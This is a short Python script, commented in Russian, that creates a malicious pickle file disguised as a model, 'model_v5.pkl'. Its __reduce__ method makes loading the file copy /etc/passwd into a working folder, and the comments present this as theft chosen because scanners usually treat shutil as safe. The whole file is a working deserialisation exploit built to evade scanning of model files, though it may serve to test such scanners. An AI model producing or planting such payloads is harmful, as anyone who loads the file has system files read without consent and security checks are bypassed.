import pickle
import shutil

class DataThiefModel:
    def __reduce__(self):
        # Попробуем «украсть» файл с паролями внутри контейнера 
        # и скопировать его в нашу рабочую папку.
        # Обычно сканеры не блокируют shutil, так как это «безопасно».
        return (shutil.copy, ('/etc/passwd', '/app/stolen_passwd.txt'))

with open('model_v5.pkl', 'wb') as f:
    pickle.dump(DataThiefModel(), f)

print("Модель-вор 'model_v5.pkl' создана!")
